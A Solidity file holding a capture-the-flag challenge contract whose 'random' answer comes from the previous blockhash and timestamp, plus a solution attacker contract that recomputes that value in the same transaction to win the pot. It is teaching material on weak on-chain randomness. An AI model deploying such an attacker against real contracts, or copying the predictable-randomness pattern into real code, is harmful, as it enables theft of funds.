pragma solidity ^0.4.21;

/*
The number is now generated on-demand when a guess is made.
*/

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable { 
        require(msg.value == 1 ether);
 
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
 
        if (n == answer) { 
            msg.sender.transfer(2 ether);
        }
    }
}
/*
Solution: Compute number in the same transaction.
*/
contract GuessTheNewNumberChallengeAttacker {
    address victim;
    address caller;

    function setVictim(address _victim) external {
        victim = _victim;
    }

    function attack() payable external {
        caller = msg.sender;
        GuessTheNewNumberChallenge(victim).guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }

    function() payable public {
    }
}